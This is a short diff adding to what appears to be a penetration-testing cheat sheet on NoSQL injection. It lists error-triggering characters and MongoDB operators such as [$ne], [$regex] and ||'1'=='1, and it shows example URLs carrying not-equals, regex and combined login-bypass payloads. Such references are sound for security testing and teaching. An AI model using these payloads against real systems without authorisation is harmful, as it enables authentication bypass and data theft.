@@ -27,6 +27,20 @@ MySQL | MongoDB
 
 > **NoSQL Injection: Test Location and Strings**
 
+Errors:
+{% highlight bash %}
+'
+"
+{
+}
+[$ne]
+[$regex]
+[$gt]
+//
+;
+||'1'=='1
+{% endhighlight %}
+
 Not Equals | <code> http://site.org/User[$ne]=1 </code>
 RegEx | <code> http://site.org/user.php?type[$regex]=.*&username[$regex]=.*
 Combined | <code> http://site.org/login.php?type[$ne]=user&username[$ne]=asdf&password=asdf'||'1'=='1' %26%26 'b' == 'b </code>
